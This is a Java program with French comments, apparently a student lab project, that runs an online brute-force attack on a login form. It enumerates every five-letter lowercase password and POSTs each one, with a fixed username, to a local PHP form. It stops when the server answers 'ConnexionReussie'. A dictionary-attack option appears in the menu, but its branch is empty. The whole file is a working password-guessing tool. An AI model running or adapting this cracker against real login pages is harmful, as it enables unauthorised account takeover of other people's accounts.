import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;
import javax.net.ssl.HttpsURLConnection;

public class Home {

    public static void main(String[] args) throws Exception {

        char[] chaine = new char[5];
        int position = 0;
        Scanner scanner = new Scanner(System.in);

        System.out.println("Choisir le type d'attaque à faire: 1/Brute Force 2/Attaque par dictionnaire");
        int choix = scanner.nextInt();

        //Si l'utilisateur choisit la méthode brute force
        if(choix == 1) {

            try {
                String passwordTrouve = bruteForceCracker(chaine, position);
                if (passwordTrouve != null) {

                    System.out.println("Mot de passe trouvé : " + passwordTrouve);

                } else {

                    System.out.println("Mot de passe non trouvé."+ passwordTrouve);

                }
            } catch (Exception e) {

                e.printStackTrace();

            }

        } 
        //Si l'utilisateur choisit la méthode attaque par dictionnaire
        else if(choix == 2) {


        }
        //S'il choisit autre chose
        else {

            System.out.println("Veuillez faire un choix entre 1 et 2");

        }
        
    }

    public static String bruteForceCracker(char[] chaine, int position) throws Exception{

        //lorsqu'on arrive à la dernière position de la chaine
        if(position == chaine.length - 1) {

            //On parcourt les différentes lettres de l'alphabet pour la dernière position
            for(int i = 97; i < 123; i++) {

                chaine[position] = decoderLaLettre(i);
                String motTrouve = new String(chaine);
                //Mame Mbaye Kane liguay insérer si sa méthode attaque par dictionnaire bi
                int response_requete = requete(motTrouve);
                if (response_requete == 5) {

                    return motTrouve;

                }
                //Fin liguay insérer
            }
            return null;
        //Si la dernière position n'est pas atteinte  
        }else {

            for(int i = 97; i < 124 - 1; i++) {

                chaine[position] = decoderLaLettre(i);
                if(bruteForceCracker(chaine, position + 1) != null) {

                    return new String(chaine);

                }
                
            }
            return null;
        }

    }

    public static char decoderLaLettre(int codeAscii) {

        return (char) codeAscii;

    }

    //la méthode qui va permettre d'envoyer les requêtes
    public static int requete(String password) throws Exception{

        String loginUrl = "http://localhost/FormulairePhp/formulaire.php";

        //fixer le login
        String login = "beuguebakh";

        String postData = "login=" + login + "&password=" + password;
        byte[] postDataBytes = postData.getBytes(StandardCharsets.UTF_8);

        try {

            URL url = new URL(loginUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.getOutputStream().write(postDataBytes);

            int responseCode = conn.getResponseCode();

            
            if (responseCode == HttpURLConnection.HTTP_OK) {

                Scanner responseScanner = new Scanner(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();

                while (responseScanner.hasNextLine()) {

                    response.append(responseScanner.nextLine());

                }
                
                String message = response.toString();
                if (message.trim().equalsIgnoreCase("ConnexionReussie")) {

                    System.out.println(message);
                    responseScanner.close();
                    conn.disconnect();
                    return 5;
                } 
                
            }

            conn.disconnect();
            return 1;

        }catch (Exception e) {

            throw e;
            
        }
    }
    
}